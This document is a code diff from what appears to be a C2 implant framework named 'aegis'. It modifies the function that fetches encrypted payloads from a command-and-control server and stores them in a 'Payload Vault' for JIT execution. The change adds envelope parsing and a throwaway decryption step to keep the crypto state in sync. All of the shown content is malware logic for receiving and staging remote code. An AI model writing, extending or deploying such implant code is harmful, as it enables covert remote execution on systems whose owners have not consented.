@@ -1088,10 +1088,35 @@ aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
     return AEGIS_ERR_NETWORK;
   }
 
-  /* const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body; */
+  const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
 
   /*
-   * IMPORTANT: We do NOT decrypt the payload here.
+   * For crypto sync, we MUST decrypt the payload response.
+   * However, for JIT execution, we store the payload STILL ENCRYPTED.
+   * This means we decrypt it twice: once here for sync, and again
+   * in the Nanomachine (using a snapshot of the crypto state).
+   */
+  size_t ct_len = resp_env->payload_len;
+  if (sizeof(aegis_c2_envelope_t) + ct_len > body_len) {
+    free(recv_buf);
+    return AEGIS_ERR_NETWORK;
+  }
+
+  uint8_t *dummy = malloc(ct_len + 16);
+  if (dummy) {
+    aegis_c2_envelope_t aad_env;
+    memcpy(&aad_env, resp_env, sizeof(aegis_c2_envelope_t));
+    memset(aad_env.iv, 0, AEGIS_GCM_IV_BYTES);
+    memset(aad_env.tag, 0, AEGIS_GCM_TAG_BYTES);
+
+    aegis_decrypt(ctx->crypto, body + sizeof(aegis_c2_envelope_t), ct_len,
+                  (const uint8_t *)&aad_env, sizeof(aegis_c2_envelope_t),
+                  resp_env->iv, resp_env->tag, dummy);
+    AEGIS_ZERO(dummy, ct_len + 16);
+    free(dummy);
+  }
+
+  /*
    * Copy the raw encrypted payload data (envelope + ciphertext)
    * to be stored in the Payload Vault for JIT execution.
    */
